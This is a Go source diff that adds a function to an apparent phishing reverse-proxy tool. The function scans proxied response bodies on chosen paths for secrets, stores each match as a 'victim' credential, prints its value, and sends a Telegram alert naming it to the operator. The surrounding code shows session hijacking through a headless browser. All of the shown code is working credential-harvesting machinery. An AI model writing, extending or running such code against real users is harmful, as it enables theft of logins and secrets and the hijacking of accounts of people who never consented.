@@ -591,6 +591,67 @@ func (t *Trace) ExtractCredentialsFromResponseHeaders(response *http.Response) (
 	return found, nil
 }
 
+// ExtractCredentialsFromResponseBody extracts tracking credentials from response body.
+// It returns true if credentials are found, false otherwise.
+func (t *Trace) ExtractCredentialsFromResponseBody(body string, response *http.Response) (found bool, err error) {
+
+	found = false
+	victim, err := t.GetVictim(t)
+	if err != nil {
+		t.Error("%s", err)
+		return found, err
+	}
+
+	// Investigate body only if the current URL.Path is related to credentials/keys to intercept
+	// given UrlsOfInterest.Credentials URLs, intercept username/password using patterns defined in the configuration
+	for _, c := range t.Session.Config.Tracking.Secrets.Paths {
+		// If the URL is a wildcard, then we need to check if the request URL matches the wildcard
+		matched := false
+		if strings.HasPrefix(c, "^") && strings.HasSuffix(c, "$") {
+			matched, _ = regexp.MatchString(c, response.Request.URL.Path)
+		} else {
+			matched = response.Request.URL.Path == c
+		}
+
+		if matched {
+			for _, p := range t.Session.Config.Tracking.Secrets.Patterns {
+
+				// Case *sensitive* matching
+				if strings.Contains(body, p.Matching) {
+					// Extract it
+					value := InnerSubstring(body, p.Start, p.End)
+					if value != "" {
+						found = true
+
+						creds := &db.VictimCredential{
+							Key:   p.Label,
+							Value: value,
+							Time:  time.Now().UTC().Format("2006-01-02 15:04:05"),
+						}
+
+						err := creds.Store(victim.ID)
+						if err != nil {
+							return false, err
+						}
+
+						message := fmt.Sprintf("[%s] [+] credentials (response): %s", t.ID, tui.Bold(creds.Key))
+						t.Info("%s=%s (%s)", message, tui.Bold(tui.Red(creds.Value)), response.Request.URL.Path)
+						if tel := telegram.Self(t.Session); tel != nil {
+							tel.Send(message)
+						}
+					}
+				}
+			}
+		}
+	}
+
+	if found {
+		t.ShowCredentials()
+	}
+
+	return found, nil
+}
+
 // HijackSession If the request URL matches those defined in authSession in the config, then
 // pass the cookies in the CookieJar to necrobrowser to hijack the session
 func (t *Trace) HijackSession(request *http.Request) (err error) {
